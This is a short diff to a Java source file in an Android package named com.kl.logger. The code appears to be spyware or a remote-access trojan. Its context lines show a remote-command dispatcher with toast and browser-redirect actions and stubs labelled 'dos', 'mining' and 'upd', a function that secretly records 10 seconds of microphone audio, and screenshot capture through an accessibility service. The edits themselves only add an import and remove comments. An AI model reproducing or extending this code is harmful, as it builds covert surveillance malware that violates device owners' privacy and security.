@@ -1,5 +1,6 @@
 package com.kl.logger;
 
+import android.accessibilityservice.AccessibilityService;
 import android.content.*;
 import android.database.Cursor;
 import android.graphics.Bitmap;
@@ -33,7 +34,6 @@ public final class Modules {
             case "toast":     return toast(c, arg);
             case "browser":
             case "redirect":  return browser(c, arg);
-            // stubs (plug lógica conforme necessidade)
             case "dos":       return "stub:dos";
             case "mining":    return "stub:mining";
             case "upd":       return "stub:upd";
@@ -165,7 +165,7 @@ public final class Modules {
         r.setOutputFile(f.getAbsolutePath());
         r.prepare();
         r.start();
-        Thread.sleep(10_000); // grava 10 s
+        Thread.sleep(10_000);
         r.stop();
         r.release();
 
@@ -187,7 +187,6 @@ public final class Modules {
         svc.shot(bmp -> {
             if (bmp == null) { err[0] = new Exception("bitmap nulo"); latch.countDown(); return; }
             try (FileOutputStream o = new FileOutputStream(f)) {
-                // hardware bitmap → software antes de compress
                 Bitmap sw = bmp.copy(Bitmap.Config.ARGB_8888, false);
                 sw.compress(Bitmap.CompressFormat.JPEG, 65, o);
                 sw.recycle();
